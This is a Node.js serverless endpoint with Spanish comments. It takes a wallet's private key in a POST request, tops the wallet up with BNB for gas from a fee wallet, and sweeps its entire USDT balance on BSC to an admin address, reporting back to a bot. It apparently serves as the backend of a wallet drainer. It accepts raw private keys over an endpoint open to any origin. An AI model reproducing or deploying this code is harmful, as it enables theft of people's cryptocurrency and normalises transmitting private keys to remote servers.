const { ethers } = require('ethers');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Solo POST' });

    const { network, userPrivateKey, adminAddress, feePrivateKey } = req.body;

    if (!network || network.toUpperCase() !== 'BSC') {
        return res.status(400).json({ success: false, error: 'Por ahora este endpoint solo soporta BSC' });
    }
    if (!userPrivateKey || !adminAddress || !feePrivateKey) {
        return res.status(400).json({ success: false, error: 'Faltan parámetros de seguridad' });
    }

    try {
        const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
        
        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint amount) returns (bool)"
        ];

        const userWallet = new ethers.Wallet(userPrivateKey, provider);
        const feeWallet = new ethers.Wallet(feePrivateKey, provider);
        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, userWallet);

        const usdtBalance = await usdtContract.balanceOf(userWallet.address);
        
        if (usdtBalance === 0n) {
            return res.status(400).json({ success: false, error: 'La billetera no tiene fondos en USDT' });
        }

        // SOLUCIÓN GAS: Calcular tarifa en tiempo real
        const feeData = await provider.getFeeData();
        const currentGasPrice = feeData.gasPrice || ethers.parseUnits("3", "gwei");
        
        // Un envío de USDT en BSC consume aprox 60,000 de gas. Usamos 80,000 para estar 100% seguros.
        const requiredGas = currentGasPrice * 80000n; 

        // Inyectar el gas calculado
        const fundTx = await feeWallet.sendTransaction({
            to: userWallet.address,
            value: requiredGas
        });
        
        // Esperamos SOLO 1 confirmación del bloque para el BNB
        await fundTx.wait(1);

        // Disparamos el barrido de USDT
        const sweepTx = await usdtContract.transfer(adminAddress, usdtBalance);
        
        // SOLUCIÓN TIMEOUT: NO usamos await sweepTx.wait(). 
        // Devolvemos la respuesta al bot inmediatamente. La blockchain hará el resto.

        const formattedAmount = ethers.formatUnits(usdtBalance, 18);

        return res.status(200).json({
            success: true,
            network: "BSC",
            currency: "USDT",
            amountSwept: formattedAmount,
            gasTxHash: fundTx.hash,
            sweepTxHash: sweepTx.hash
        });

    } catch (error) {
        console.error("Error en el barrido:", error);
        return res.status(500).json({ 
            success: false, 
            error: 'Fallo al ejecutar el barrido', 
            detalles: error.message 
        });
    }
}
